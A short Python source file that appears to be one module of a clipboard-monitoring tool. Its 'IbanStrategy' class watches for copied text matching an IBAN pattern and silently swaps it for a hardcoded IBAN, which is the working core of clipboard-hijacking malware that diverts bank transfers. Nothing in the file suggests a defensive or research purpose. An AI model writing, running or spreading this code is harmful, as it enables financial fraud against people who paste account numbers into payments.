import re

import clipboard

from model.event_type import EventType
from strategies.handler import AbstractStrategy


class IbanStrategy(AbstractStrategy):
    def can_handle(self, text: str, event_type: EventType) -> bool:
        return text != "" and (event_type == EventType.ON_UPDATED_TEXT or event_type == EventType.ON_KEYBOARD_COPY)

    def process_text(self, text: str, window_title: str, event_type: EventType) -> None:
        if re.match("^[A-Z]{2}[0-9]{2}(?:[ ]?[0-9]{4}){4}(?:[ ]?[0-9]{1,2})?$", text):
            clipboard.copy("DE12345678901234567890")
